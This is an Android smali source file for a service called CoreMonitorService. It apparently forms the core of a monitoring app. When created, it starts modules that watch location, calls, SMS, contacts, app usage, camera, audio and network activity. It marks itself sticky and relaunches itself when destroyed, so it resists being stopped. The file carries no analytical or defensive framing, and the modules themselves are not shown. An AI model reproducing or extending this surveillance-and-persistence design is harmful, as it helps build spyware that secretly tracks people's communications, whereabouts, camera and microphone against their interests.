.class public Lcom/smilex/enhanced/services/CoreMonitorService;
.super Landroid/app/Service;
.source "CoreMonitorService.java"

.field private mHandler:Landroid/os/Handler;
.field private mRunnable:Ljava/lang/Runnable;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .registers 3
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    # Start as foreground service (Android 8+ requirement)
    invoke-static {p0}, Lcom/smilex/enhanced/utils/ForegroundHelper;->startForeground(Landroid/app/Service;)V

    # Initialize all monitoring modules
    invoke-static {p0}, Lcom/smilex/enhanced/modules/LocationModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/CallModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/SmsModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/ContactsModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/AppUsageModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/CameraModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/AudioModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/NetworkModule;->init(Landroid/content/Context;)V
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5
    # START_STICKY = 1 (restart if killed)
    const/4 v0, 0x1
    return v0
.end method

.method public onDestroy()V
    .registers 2
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
    # Restart service on destroy
    invoke-static {p0}, Lcom/smilex/enhanced/utils/ServiceLauncher;->restartCoreService(Landroid/content/Context;)V
    return-void
.end method
